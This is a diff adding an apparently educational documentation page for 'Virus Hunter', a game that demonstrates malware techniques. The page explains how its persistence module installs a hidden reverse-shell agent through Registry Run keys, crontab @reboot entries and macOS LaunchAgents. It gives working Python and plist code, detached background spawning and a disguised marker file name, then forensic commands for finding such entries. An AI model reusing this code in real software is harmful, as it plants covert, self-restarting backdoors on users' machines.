@@ -1,0 +1,227 @@
+---
+title: 'Persistence'
+description: 'How Virus Hunter installs itself to survive reboots using platform-specific autostart mechanisms, and what this teaches about how malware achieves persistence.'
+keywords: ['persistence', 'registry', 'crontab', 'launchagent', 'autostart', 'malware', 'cybersecurity education']
+---
+
+**Persistence** is the ability to survive a reboot. Without it, malware must re-infect a machine every time it restarts — a significant operational burden. With it, the implant re-launches automatically without any further action from the attacker.
+
+`cyber_modules/persistence.py` implements persistence using the native autostart mechanism of each supported operating system.
+
+## The agent command
+
+All three persistence methods install the same command:
+
+```python
+agent_cmd = f'"{python_exe}" "{main_game.py}" --bg --host {host}'
+```
+
+- `python_exe` — the full path to the current interpreter (`sys.executable`), ensuring the right Python version is used on reboot.
+- `main_game.py` — the absolute path to the game entry point.
+- `--bg` — background mode flag (see [Background mode](#background-mode) below).
+- `--host` — the C2 host address baked in at install time.
+
+## Platform persistence methods
+
+<Tabs>
+  <Tab title="Windows">
+    Windows uses the Registry `Run` key to launch programs at login. The agent writes to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` using the `winreg` module:
+
+    ```python
+    import winreg
+
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0,
+        winreg.KEY_SET_VALUE
+    )
+    winreg.SetValueEx(key, "VirusHunterAgent", 0, winreg.REG_SZ, agent_cmd)
+    winreg.CloseKey(key)
+    ```
+
+    - `HKCU` (current user) requires no administrator privileges — any user account can write here.
+    - `REG_SZ` — the value type is a plain string.
+    - The value name `VirusHunterAgent` is what you will see in Task Manager's Startup tab or in `regedit`.
+
+    To verify in a real Windows session:
+    ```bash
+    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    ```
+  </Tab>
+
+  <Tab title="Linux">
+    Linux uses `cron` with the special `@reboot` directive to run a command once at system startup:
+
+    ```python
+    import subprocess
+
+    # Read existing crontab
+    result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+    existing = result.stdout
+
+    # Append the @reboot entry
+    new_crontab = existing + f"@reboot {agent_cmd}\n"
+
+    # Write back
+    proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
+    proc.communicate(input=new_crontab.encode())
+    ```
+
+    The resulting crontab entry looks like:
+    ```
+    @reboot "/usr/bin/python3" "/home/user/game/main_game.py" --bg --host 192.168.1.100
+    ```
+
+    To verify:
+    ```bash
+    crontab -l
+    ```
+  </Tab>
+
+  <Tab title="macOS">
+    macOS uses **LaunchAgents** — plist files in `~/Library/LaunchAgents/` that `launchd` reads at login. The agent writes a plist at `com.v-hunter.agent.plist`:
+
+    ```xml
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+        "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+    <plist version="1.0">
+    <dict>
+        <key>Label</key>
+        <string>com.v-hunter.agent</string>
+        <key>ProgramArguments</key>
+        <array>
+            <string>/usr/bin/python3</string>
+            <string>/Users/user/game/main_game.py</string>
+            <string>--bg</string>
+            <string>--host</string>
+            <string>192.168.1.100</string>
+        </array>
+        <key>RunAtLoad</key>
+        <true/>
+        <key>KeepAlive</key>
+        <true/>
+    </dict>
+    </plist>
+    ```
+
+    - `RunAtLoad: true` — start immediately when the plist is loaded (at login).
+    - `KeepAlive: true` — `launchd` restarts the process automatically if it exits.
+
+    `KeepAlive` makes macOS persistence particularly robust: the agent is restarted not only on reboot but whenever it crashes or is killed.
+
+    To verify:
+    ```bash
+    launchctl list | grep v-hunter
+    ls ~/Library/LaunchAgents/com.v-hunter.agent.plist
+    ```
+  </Tab>
+</Tabs>
+
+## Background mode
+
+The `--bg` flag tells `main_game.py` to skip Pygame entirely and run only the reverse shell:
+
+```python
+# In main_game.py
+if "--bg" in sys.argv:
+    # No GUI, no game window
+    ReverseShell._connect_and_shell()
+else:
+    # Normal game startup with Pygame
+    run_game()
+```
+
+This is critical for persistence: a GUI window appearing at every login would immediately alert the user. The `--bg` process is invisible — no window, no taskbar entry, no dock icon.
+
+<Note>
+  On Windows, `pythonw.exe` (instead of `python.exe`) can be used to launch Python with no console window. The agent command uses `sys.executable` which may point to either, depending on installation.
+</Note>
+
+## Immediate background spawn
+
+In addition to installing the autostart entry, the persistence module also spawns a detached background process immediately, so the shell is running right now without waiting for a reboot:
+
+<Tabs>
+  <Tab title="Windows">
+    ```python
+    import subprocess
+
+    subprocess.Popen(
+        agent_cmd,
+        creationflags=0x00000008 | 0x00000200,  # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
+        shell=True
+    )
+    ```
+
+    The creation flags detach the new process from the parent's console and process group, so closing the game window does not kill the background agent.
+  </Tab>
+
+  <Tab title="Linux / macOS">
+    ```python
+    import subprocess
+
+    subprocess.Popen(
+        agent_cmd,
+        shell=True,
+        start_new_session=True  # Equivalent to calling setsid()
+    )
+    ```
+
+    `start_new_session=True` creates a new process group and session, detaching the child from the parent's terminal and signal handling.
+  </Tab>
+</Tabs>
+
+## The PERSISTENCE_MARKER file
+
+After installing persistence, the module writes a marker file:
+
+```
+cyber_modules/simulated_startup/system_defender_autorun.txt
+```
+
+This file signals to the rest of the game that persistence is active. It is used by the UI to update status indicators, and by the cleanup routine to confirm that removal is complete.
+
+<Info>
+  The marker file name is intentionally disguised as a legitimate system file (`system_defender_autorun.txt`) — reflecting how real malware often uses innocuous-sounding names to avoid suspicion.
+</Info>
+
+## Real-world implications
+
+<Warning>
+  Persistence is one of the MITRE ATT&CK framework's core tactic categories (TA0003). The three mechanisms used here — Registry Run keys, cron `@reboot`, and LaunchAgents — are among the most commonly observed persistence techniques in real malware investigations.
+
+  Real-world examples:
+  - **Emotet** used `HKCU\Run` registry keys.
+  - **Silver Sparrow** (macOS malware, 2021) used LaunchAgents with `RunAtLoad`.
+  - Many Linux backdoors use `@reboot` crontab entries.
+</Warning>
+
+## The educational lesson
+
+<Tip>
+  After any suspicious activity on a machine, always check startup locations:
+
+  **Windows:**
+  ```bash
+  reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+  ```
+
+  **Linux:**
+  ```bash
+  crontab -l
+  cat /etc/crontab
+  ls /etc/cron.d/
+  ```
+
+  **macOS:**
+  ```bash
+  ls ~/Library/LaunchAgents/
+  ls /Library/LaunchAgents/
+  ls /Library/LaunchDaemons/
+  ```
+
+  Persistence mechanisms are often the most reliable forensic indicator that a machine has been compromised. Finding an unexpected entry in any of these locations warrants immediate investigation.
+</Tip>
